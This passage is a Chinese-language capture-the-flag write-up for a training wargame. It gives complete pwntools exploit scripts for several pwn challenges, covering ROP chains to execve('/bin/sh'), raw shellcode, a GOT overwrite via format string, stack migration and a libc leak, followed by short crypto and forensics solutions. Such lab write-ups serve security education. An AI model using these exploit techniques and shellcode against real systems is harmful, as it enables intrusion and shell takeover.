    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea064)  # @ .data + 4
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9)  # pop ebx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080de769)  # pop ecx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0806c943)  # int 0x80
    r.sendline(p)

    r.interactive()
```
## 60 ROP2
真正的ROP，沒辦法直接用ROPgadget來生成ROP chain了
先觀察一下後發現在overflow函式中有呼叫3號的syscall

[查表](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)後可發現是對應到read函式，又應沒有開啟Canary所以可以從這邊overflow
陣列長度為0xc因此padding長度為0xc+0x4=0x10
接下來就要來開始寫ROP chain了，目標為11號system call -> execve，然後再來呼叫/bin/sh來開啟shell


然後為了要寫上/bin/sh，我們自己需要再呼叫一次read system call來進行寫入，對應的參數為 systemcall(0x3, 0, bss_address, 0x8)
因此第一部分的ROP chain內容為


| Stack Content               |
| --------------------------- |
| system call funtion address |
| overflow funciton address   |
| 0x3                         |
| 0x0                         |
| bss_address                 |
| 0x8                         |


然後第二段就是要來呼叫execve
| Stack Content                                   |
| ----------------------------------------------- |
| system call funtion address                     |
| overflow funciton address(不過這個不重要就是了) |
| 0x11                                            |
| bss_address                                     |
| 0x0                                             |
| 0x0                                             |

```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7703)
    elf = pwn.ELF('./asset/rop2')
    bss_addr = elf.bss()
    system_call_addr = 0x08048320
    overflow_addr = 0x08048454

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0x3) + p32(0x0) + p32(bss_addr) + p32(0x8)
    r.send(p)
    r.send(b'/bin/sh\x00')

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0xb) + p32(bss_addr) + p32(0x0) + p32(0x0)
    r.send(p)
    r.interactive()
```

## 61 toooomuch
反編譯一下知道passcode是43210之後輸入後玩猜數字遊戲後flag就出來了

## 62 toooomuch-2
這題沒有開啟NX因此有可寫可執行的記憶體區段，可以用shell code來解
可以先從[這裡](https://www.exploit-db.com/shellcodes)挑選一個合適的shell code，然後就可以來尋找可以寫入的區段了
使用gdb的vmmap後會顯示出寫可執行的記憶體區段

![image alt](https://i.imgur.com/faGFd6E.png")

等等可以選用0x08049000到0x0804a000的位置來進行寫入
寫入時一樣先計算好padding為(0x18 + 0x4)後
接著讓程式return到gets的位置來在我們所指定的位置寫入shell code
下一個內容為gets function的return address
最後是gets function的argument也就是寫入的位置
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7702)
    shell_code = b'\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a'
    gets_addr = 0x08048480
    wx_addr = 0x08049000
    p = b'a' * (0x18 + 4)
    p += p32(0x08048480)  # return to gets function
    p += p32(0x08049000)  # gets function's return address
    p += p32(0x08049000)  # gets function's argument
    r.recvuntil(b'passcode: ')
    r.sendline(p)
    r.sendline(shell_code)
    r.interactive()
```

## 63 echo
這題的核心概念是格式化字串攻擊，藉由printf寫入相關資訊，然後開啟shell
除此之外，更用到了呼叫library函式的漏洞
當程式執行到library function時，會跳轉到對應的plt，然後plt中會檢查該函式的got是否有被填上，若有則跳轉到該位置，執行library function，若否，則填上got後再執行。

此時，got位置便若是被修改，則可跳轉到任意地址，但條件是程式不能為full relro。

這個題目的解法便是將printf的got修改為system的plt後開啟shell
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7711)
    printf_got = 0x0804a010
    system_plt = 0x08048400

    p = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
    #  00 84 04 08    system's plt
    p += b'%240c%7$hhn'  # write 0x00
    p += b'%132c%8$hhn'  # write 0x84
    p += b'%128c%9$hhn'  # write 0x04
    p += b'%4c%10$hhn'   # write 0x08
    r.sendline(p)
    r.sendline('/bin/sh\00')

    r.interactive()
```

## 67 smashthestack
這題是利用了 __stack_chk_fail function 顯示錯誤訊息時，會顯示出 argv[0] 的特性，因此可以透過 buffer overflow 的方式，把值蓋成 flag 的地址，這樣在顯示錯誤訊息的時候就會噴出 flag 了。
不過這只在特定的 lib 版本有效就是了。

```python=
r = remote('hackme.inndy.tw',7717)
r.recvuntil(b'Try to read the flag\n')
target_abbr = 0x0804a060
p = p32(target_abbr) * 0x300

r.send(p)
r.interactive()
```

## 68 onepunch
開 ida 看 code，這題給你輸入兩個數字，然後讓你可以修改任意位置的值，但是限制是一次只能寫一個 byte。

但一個 byte 實在是做不了甚麼事，所以就先想說要怎麼樣才可以修改多個 byte，又或者是說可以多修改幾次。

再分析了一下 code 後，看到這個程式初始化時，會跑一個名字是 _ 的 function，裡面做的事是把 code section 的權限改成可讀、可寫、可執行。
![image](https://hackmd.io/_uploads/rJewqnTell.png)

這個也可以從 gdb 的 vmmap 中看到
![image](https://hackmd.io/_uploads/BJrCcnTexe.png)

有這個條件就方便了，可以從 code section 中找目標下手，我這邊是選了下面圖裡的 jnz，把他跳躍的目標從後面 address 改成向前到特定的 address 就可以做到重複任意寫了。
![image](https://hackmd.io/_uploads/ry0Ei36gll.png)

後面就簡單了，找個地方把 shellcode 寫上去，再用相同手法修改 jnz 的目的地，就可以拿到 shell 了

```python=
# set jmp back to certain address
data = [(0x400768, 180)]

# write shell code from 0x400790
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
for i in range(len(shellcode)):
    data.append((0x400790 + i, shellcode[i]))

# set jmp to 0x400790
data.append((0x400768, 39))

#r = process("./asset/onepunch")
r = remote('hackme.inndy.tw',7718)
input("Press any button to continue...")
for i in range(len(data)):
    r.recvuntil(b'Where What?')
    s = hex(data[i][0])[2:] + ' ' + str(data[i][1])
    s = s.encode('utf-8')
    print("s:", s)
    r.sendline(s)
r.interactive()
```


## 70 rsbo
這題進行 read 時長度設為 0x80，但 buffer 長度只有 80，因此可以進行 bof，但 bof 長度不夠，可以透過 Stack Migration 的方式增加 ROPchain 的長度

1. 先使用 read 將讀取 flag 的 ROPchain 讀到 bss 中 (額外加上 0x800 是為了避免蓋到 libc function)，然後將 return address 設為 _start，讓程式跳到最開始
2. 使用 Stack Migration 的方式，用 pop ebp 設定 ebp 值後，再使用 leave (等同於 mov esp, ebp, pop ebp)，設定 esp 值
3. 程式跳轉到步驟 1 寫入的 ROPchin，讀取 flag 並 write 出來

```python=
from pwn import *

#r = process("./asset/rsbo")
r = remote("ctf.hackme.quest", 7706)
elf = ELF("./asset/rsbo")
num = 0
start_addr = elf.sym['_start']
home_flag_str = 0x080487d0
open_addr = 0x08048420
read_addr = 0x80483e0
write_addr = 0x8048450
pop_ebp = 0x0804879f
pop_edi_ebp = 0x0804879e
pop_esi_edi_ebp = 0x0804879d
data = elf.bss() + 0x800
leave_addr = 0x080484f8
rop_chain = [
    open_addr,
    pop_edi_ebp,
    home_flag_str,
    p32(0),
    read_addr,
    pop_esi_edi_ebp,
    p32(3),
    elf.bss(),
    p32(0x80),
    write_addr,
    p32(0xdeadbeef),
    p32(1),
    elf.bss(),
    p32(0x80)
]

rop_chain_read = [
    read_addr,
    start_addr,
    p32(0),
    data,
    p32(len(rop_chain) * 4)
]
rop_chain_set_ebp = [
    pop_ebp,
    data - 4,
    leave_addr
]
p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_read)
#input()
r.send(p)
r.send(flat(rop_chain))
p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_set_ebp)
r.send(p)
r.interactive()
```

## 71 rsbo-2
跟上一題一樣的 binary，但是要取得 shell，不過 binary 當中沒有 system function，gadget 也沒有 syscall 可以利用，所以要先 leak library base address，來找到 system function address

1. 透過顯示 write got 位置的值來找出 write 在 library 實際的 address
2. 使用 read 將 /bin/sh 寫入到記憶體中
3. 使用 system 得到 shell

```python=
from pwn import *

#r = process("./asset/rsbo")
r = remote("ctf.hackme.quest", 7706)
lib = ELF('./asset/libc-2.23.so.i386')
elf = ELF("./asset/rsbo")
write_address = lib.sym['write']
system_address = lib.sym['system']
read_addr = 0x80483e0
write_addr = 0x8048450
write_got = elf.got['write']
pop_esi_edi_ebp = 0x0804879d
data = elf.bss() 
start_addr = elf.sym['_start']

rop_get_write = [
    write_addr,
    start_addr,
    p32(1),
    write_got,
    p32(0x4)
]
rop_write_shell = [
    read_addr,
    start_addr,
    p32(0),
    data,
    p32(8)
]
#input()

num = 0
p = num.to_bytes(1, 'little') * 108 + flat(rop_get_write)
r.send(p)
write_addr_2 = r.recv(4)
write_addr_2 = int.from_bytes(write_addr_2, 'little')
base = write_addr_2 - lib.sym['write']
print("write_addr_2:", hex(write_addr_2), " write got:", hex(write_got))
p = num.to_bytes(1, 'little') * 108 + flat(rop_write_shell)
r.send(p)
r.send(b'/bin/sh\0')
print("system address:", hex(system_address))
rop_get_shell = [
    base + lib.sym['system'],
    p32(0xdeadbeff),
    data
]
p = num.to_bytes(1, 'little') * 108 + flat(rop_get_shell)
r.send(p)

r.interactive()
```

## 72 leave_msg
這題的程式是先讓你輸入一段訊息，再讓你輸入一個 index 來存放那段訊息，但是 index 有限定的範圍，因此先繞過這個限制達到任意寫。

他這邊是用輸入 slot 的最前面字元是否為 "-" 來判斷負數，但 atoi function 中，第一個字可以是空白，所以輸入 "<空格>-<index>" 就可以達到任意寫了

接著可以把這個值寫到 got section，hook library function，但又有另一個限制是他會用 strlen 來限制長度要小於 8，所以可以先把這個 function 先蓋掉後再來寫 shellcode

```python=
context.arch = 'i386'
#r = process("./asset/leave_msg")
r = remote('hackme.inndy.tw',7715)
elf = ELF("./asset/leave_msg")

data = 0x0804a060
shellcode = b"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
strlen_got = elf.got['strlen']
puts_got = elf.got['puts']

r.recvuntil(b'I\'m busy. Please leave your message:\n')
r.sendline(asm('xor eax, eax; ret'))
r.recvuntil(b'Which message slot?\n')
r.sendline((' ' + str((strlen_got - data) / 4)).encode())
r.recvuntil(b'I\'m busy. Please leave your message:\n')
r.sendline(shellcode)
r.recvuntil(b'Which message slot?\n')
r.sendline((' ' + str((puts_got - data) / 4)).encode())
r.interactive()
```

# Crypto

## 81 easy
先把hex值轉成ascii後再做base64解碼

## 82 r u kidding
[凱薩加密](https://www.dcode.fr/caesar-cipher)

## 83 not hard
使用python中的base64套件可輕鬆解決。

觀察原始輸入，覺得可能是使用Base85編碼法，解碼後看到文字最後帶有"="符號，嘗試使用base64後得出的結果似乎不正確。

經嘗試後發現應該是要再使用base32解碼，然後flag就出來了。
```python=
import base64

data = 'Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I*lPc%_SMOjQ#O;uV{MM*?PPFhk|Hd;hVPFhq{HaAH<'
data_85 = base64.b85decode(data)
print(base64.b32decode(data_85))
```

## 84 classic cipher 1
可以使用[quipqiup](https://www.quipqiup.com/)這個網站來計算出原本的訊息。

解出來後再去除空格，轉成大寫就可以了。

## 85 classic cipher 2
這題就是在考Vigenere加密法，這裡就給幾個提示然後就留給大家自己分析了

1. key的長度為51
2. 解密出來的文章前幾個字為 A CAESAR SALAD IS A SALAD OF ROMAINE

## 86 easy AES
題目一開始給了一個py檔，需要安裝pycrypto套件才能正常執行，但不知道是甚麼環境問題，我的電腦無法正常安裝此套件。因此改為安裝"pycryptodome"套件作為替代

接下來，我們需要輸入一個明文，並使用"Hello, World...!"金鑰加密後得到"Good Plain Text!"的結果。

由於AES為對稱式加密，因此先將"Good Plain Text!"以"Hello, World...!"金鑰解密後即可得到對應的明文，這邊需要注意的是此處使用的模式為"ECB"模式

```python=
c = AES.new(b'Hello, World...!', AES.MODE_ECB)
plain_text = c.decrypt(b'Good Plain Text!')
print(plain_text)
```
## 87 one time padding
題目將key為0的可能除去掉了，因此只需要重複蒐集255個加密過後不同的密文，然後找出沒有出現過的那一個，即是flag

然後在蒐集過程中發現，奇數位置的資料是沒有用的資料，因此僅蒐集分析偶數位置的資料
```python=
import requests

url = 'https://ctf.hackme.quest/otp/?issue_otp=1'

for i in range(0, 100, 2):
    table = {}
    while len(table) != 255:
        content = requests.get(url)
        data = content.text.split('\n')
        for j in range(20):
            num = data[j][i: i+2]
            table[int(num, 16)] = 1
    for j in range(256):
        if j not in table:
            print(chr(j), end='')
            break
```

## 88 shuffle
觀察題目的script檔後可知crypted.txt中的內容是被依一個固定的table進行了替換，而plain.txt則是被由原先的明文隨機進行過排序的。

因此可以比對兩檔案中各個字符的出現次數，若次數相等則代表著他們之間的替換關係，如果有多個可能的替換關係的話，全部顯示出來自己工人智慧一下應該也就能看出flag了。

## 89 login as admin 2
可以使用[Hash Extender](https://github.com/iagox86/hash_extender)來進行長度擴充攻擊，詳細的原理可以參考這個[網站](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)。

## 92 xor
一開始先使用xortool來進行分析得出key為"HACKMEPLS"，從檔案中也可以看到flag的片段，但還不正確。

幾次嘗試過後發現將key轉為小寫就可以了。

# Lucky
## 99 you-guess
還真的就是用猜的，不過他給的 code 裡面有一行
```python=
key = bytes.fromhex(sha512('%s really hates her ex.' % password))
```
所以猜說 password 可能是個人名，接著在網路上找個人名 list 試就好了

避免你在格式上浪費時間，人名的第一個字是小寫...
```python=
import hashlib
import sys

def sha512(s):
    return hashlib.sha512(s.encode()).hexdigest()

f = open('./asset/names.txt')
names = f.readlines()
f.close()
for password in names:
    password = password[:-1]
    h = sha512('your hash is ' + sha512(password) + ' but password is not password')

    if h == '2a9b881b84d4386e39518c8802cc8167ec84d37118efd3949dbedd5e73bf74b62d80bf1531b7505a197565660bf452b2641cd5cd12f0c99c502a4d72c28197f2':
        print('found')
        key = bytes.fromhex(sha512('%s really hates her ex.' % password))
        encrypted = bytes.fromhex('20a6b2b83f1731a5bafdc19b4c954cd34419412951e85de45fb904fc5c1a9470eda8d58483e1fb66e3e13f656e0677f75fccb6ff0577e42b5c53620d10178c0f')
        flag = bytearray(i ^ j for i, j in zip(bytearray(key), bytearray(encrypted)))
        print(flag.decode().strip(',.~'))

print('end')
```

# Forensic
## 100 easy pdf
轉為xml格式後ctrl F搜尋就有了

## 101 this is a pen
轉為doc格式後把第二頁的圖片解群組後，慢慢刪掉其他的圖片後就可以找到了。

